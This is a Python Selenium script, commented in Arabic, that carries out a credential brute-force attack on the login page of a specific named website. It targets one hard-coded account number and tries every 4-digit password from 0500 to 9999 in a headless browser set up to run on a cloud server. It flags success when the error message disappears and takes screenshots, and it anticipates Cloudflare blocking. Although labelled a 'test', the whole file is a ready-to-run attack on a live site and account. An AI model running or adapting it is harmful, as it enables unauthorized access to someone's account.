import time
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException

# --- إعدادات الاختبار ---
TARGET_URL = "https://menhel-ndb-2.online"
USERNAME = "33772020"
PASSWORD_START = 500
PASSWORD_END = 9999

# رسالة الخطأ التي تظهر عند الفشل
ERROR_MESSAGE = "خطأ في تسجيل الدخول" 

# --- إعدادات Selenium ---
options = webdriver.ChromeOptions()
# --!! تعديل مهم جداً للخادم !! --
options.add_argument("--headless") # تشغيل المتصفح بدون واجهة رسومية
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
options.add_argument("--window-size=1920,1080") 
options.add_argument("--disable-gpu") # موصى به في وضع headless

# --- وظيفة الاختبار الرئيسية ---
def run_brute_force_test():
    driver = None
    try:
        # تهيئة المتصفح
        # لا حاجة لتحديد مسار ChromeDriver، Render سيهتم بذلك
        driver = webdriver.Chrome(options=options)
        driver.get(TARGET_URL)
        
        print("تم فتح الموقع، الانتظار 5 ثواني...")
        time.sleep(5) 

        try:
            WebDriverWait(driver, 10).until(
                EC.presence_of_element_located((By.NAME, "auths"))
            )
            print("تم العثور على حقل اسم المستخدم بنجاح.")
        except TimeoutException:
            print("!!! فشل التحقق الأولي !!!")
            print("لم يتم العثور على حقل اسم المستخدم. قد يكون الموقع محجوبًا أو غير متاح.")
            # حفظ لقطة شاشة للمساعدة في تصحيح الأخطاء
            driver.save_screenshot('debug_screenshot.png')
            print("تم حفظ لقطة شاشة باسم debug_screenshot.png")
            return

        for i in range(PASSWORD_START, PASSWORD_END + 1):
            password = str(i).zfill(4)
            print(f"تجربة كلمة المرور: {password}")
            
            try:
                username_field = driver.find_element(By.NAME, "auths") 
                password_field = driver.find_element(By.NAME, "password")
                login_button = driver.find_element(By.XPATH, "//button[@type='submit']")
                
                username_field.clear()
                username_field.send_keys(USERNAME)
                password_field.clear()
                password_field.send_keys(password)
                
                login_button.click()
                
                time.sleep(3) 
                
                if ERROR_MESSAGE not in driver.page_source:
                    print(f"\n*** نجاح! تم تسجيل الدخول بكلمة المرور: {password} ***")
                    # حفظ لقطة شاشة للنجاح
                    driver.save_screenshot('success_screenshot.png')
                    print("تم حفظ لقطة شاشة للنجاح باسم success_screenshot.png")
                    break
                else:
                    print(f"فشل المحاولة: {password}.")
                    
            except NoSuchElementException:
                print(f"\n!!! توقف الأتمتة عند المحاولة {password} !!!")
                print("لم يتم العثور على حقول تسجيل الدخول. قد يكون Cloudflare قد حظر الوصول.")
                driver.save_screenshot('error_screenshot.png')
                break
            except Exception as e:
                print(f"حدث خطأ غير متوقع أثناء المحاولة {password}: {e}")
                break
                
    except Exception as e:
        print(f"حدث خطأ فادح في تشغيل المتصفح: {e}")
    finally:
        if driver:
            driver.quit()
            print("تم إغلاق المتصفح.")

if __name__ == "__main__":
    run_brute_force_test()

